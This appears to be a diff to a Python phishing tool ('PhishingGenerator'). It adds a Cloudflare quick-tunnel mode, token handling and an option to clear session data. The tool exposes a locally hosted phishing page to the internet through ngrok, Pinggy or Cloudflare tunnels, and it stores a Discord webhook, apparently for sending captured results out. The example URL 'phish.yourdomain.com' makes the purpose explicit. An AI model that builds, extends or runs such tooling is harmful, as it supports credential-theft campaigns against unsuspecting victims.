@@ -639,11 +639,22 @@ class PhishingGenerator:
         self._save_session_key('ngrok_token', token)
 
     def _clear_session_token(self):
+        self._clear_session_keys(['ngrok_token'])
+
+    def _clear_session_all(self):
+        self._clear_session_keys([
+            'ngrok_token', 'ngrok_region', 'server_port',
+            'webhook_url', 'tunnel_type', 'cf_token', 'cf_url',
+            'language'
+        ])
+
+    def _clear_session_keys(self, keys):
         if os.path.exists(SESSION_FILE):
             try:
                 with open(SESSION_FILE, 'r') as f:
                     session = json.load(f)
-                session.pop('ngrok_token', None)
+                for key in keys:
+                    session.pop(key, None)
                 with open(SESSION_FILE, 'w') as f:
                     json.dump(session, f)
             except:
@@ -950,39 +961,77 @@ class PhishingGenerator:
             raise
 
     def _start_cloudflare(self):
+        import select
         addr = str(self.server_port)
-        if not self.cf_token:
-            self.cf_token = console.input("\n[yellow][[?]] Enter Cloudflare Tunnel token: [/]")
-            self._save_session_key('cf_token', self.cf_token)
         try:
             subprocess.run(["cloudflared", "version"], capture_output=True, check=True, timeout=10)
         except:
             self._install_cloudflared()
 
-        console.print(f"[cyan]⟳ Starting Cloudflare tunnel...[/]")
+        # Determine mode: token (pre-configured tunnel) vs quick (trycloudflare)
+        if not self.cf_token:
+            use_quick = True
+            console.print("\n[cyan]⟳ No token found. Using Quick Tunnel (trycloudflare.com)...[/]")
+        else:
+            use_quick = False
+            console.print(f"[cyan]⟳ Starting Cloudflare tunnel with token...[/]")
+
+        console.print(f"[dim]Port: {addr}[/]")
         try:
-            self.tunnel_process = subprocess.Popen(
-                ["cloudflared", "tunnel", "--no-autoupdate", "run", "--token", self.cf_token],
-                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
-            )
-            time.sleep(6)
+            if use_quick:
+                self.tunnel_process = subprocess.Popen(
+                    ["cloudflared", "tunnel", "--no-autoupdate", "--url", f"http://localhost:{addr}"],
+                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
+                )
+            else:
+                self.tunnel_process = subprocess.Popen(
+                    ["cloudflared", "tunnel", "--no-autoupdate", "run", "--token", self.cf_token],
+                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
+                )
+
             url = None
             start = time.time()
             while time.time() - start < 25:
-                line = self.tunnel_process.stdout.readline()
-                if line and ('://' in line and 'trycloudflare.com' in line):
-                    for word in line.strip().split():
-                        if '://' in word and 'trycloudflare.com' in word:
-                            url = word.strip()
-                            break
+                r, _, _ = select.select([self.tunnel_process.stdout], [], [], 0.5)
+                if r:
+                    line = self.tunnel_process.stdout.readline()
+                    if not line:
+                        continue
+                    line = line.strip()
+                    if use_quick:
+                        if 'trycloudflare.com' in line:
+                            for w in line.split():
+                                if '://' in w and 'trycloudflare.com' in w:
+                                    url = w.strip()
+                                    break
+                    else:
+                        # Token mode: check for connection confirmation
+                        if 'Starting tunnel' in line or 'Registered tunnel' in line or 'Connection' in line:
+                            console.print(f"[dim]  {line[:120]}[/]")
                 if url:
                     break
+
             if url:
                 self.server_url = url
                 console.print(f"[green]✅ Cloudflare tunnel: {url}[/]")
+            elif use_quick:
+                console.print("[yellow]⚠ Quick tunnel URL not found. Check logs.[/]")
+                self.server_url = None
             else:
-                console.print("[yellow]Cloudflare tunnel started, awaiting URL... check logs[/]")
-                self.server_url = f"http://localhost:{addr}"
+                # Token mode: URL is the public hostname user configured in dashboard
+                saved_url = self._load_session_key('cf_url')
+                if saved_url:
+                    self.server_url = saved_url
+                    console.print(f"[green]✅ Cloudflare tunnel started → {saved_url}[/]")
+                else:
+                    console.print("[yellow]Enter your tunnel's public hostname/URL (from Cloudflare dashboard):[/]")
+                    public_url = console.input(f"[cyan]URL (e.g. https://phish.yourdomain.com): [/]").strip().rstrip('/')
+                    if public_url:
+                        self.server_url = public_url
+                        self._save_session_key('cf_url', public_url)
+                        console.print(f"[green]✅ Cloudflare tunnel → {public_url}[/]")
+                    else:
+                        self.server_url = f"http://localhost:{addr}"
         except Exception as e:
             msg = f"❌ Cloudflare failed: {str(e)[:80]}"
             self.logger.error(msg)
@@ -1092,8 +1141,9 @@ class PhishingGenerator:
         console.print("[3] Change server port")
         console.print("[4] Set Discord webhook URL")
         console.print("[5] Clear webhook URL")
-        console.print("[6] Back to menu")
-        choice = console.input("\n[yellow][[?]] Select option (1-6): [/]")
+        console.print("[6] Clear all session data (tokens, URLs)")
+        console.print("[7] Back to menu")
+        choice = console.input("\n[yellow][[?]] Select option (1-7): [/]")
         if choice == "1":
             console.print("\n[1] Ngrok")
             console.print("[2] Pinggy (SSH, no auth)")
@@ -1143,6 +1193,9 @@ class PhishingGenerator:
             self.webhook_url = None
             self._save_session_key('webhook_url', None)
             console.print("[green]✓ Webhook URL cleared[/]")
+        elif choice == "6":
+            self._clear_session_all()
+            console.print("[green]✓ All session data cleared (tokens, URLs, settings)[/]")
         console.input("\n[green]Press Enter to continue...[/]")
 
     def export_results(self):
